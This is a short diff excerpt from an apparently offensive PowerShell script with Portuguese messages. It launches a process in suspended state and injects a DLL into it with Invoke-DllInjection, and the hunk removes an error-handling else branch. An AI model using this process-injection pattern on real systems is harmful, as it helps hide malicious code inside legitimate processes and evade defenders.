@@ -530,6 +530,3 @@ Write-Host "Ao ser telado fecha o processo $($result.File)"
 $Process = Invoke-CreateProcess -Binary $result.Path -CreationFlags 0x00000004 -ShowWindow 0x1 -StartF 0x1
 Invoke-DllInjection -Dll $setupPath -ProcessID $Process.dwProcessId
 
-else {
-	Write-Host "Deu B.O"
-}
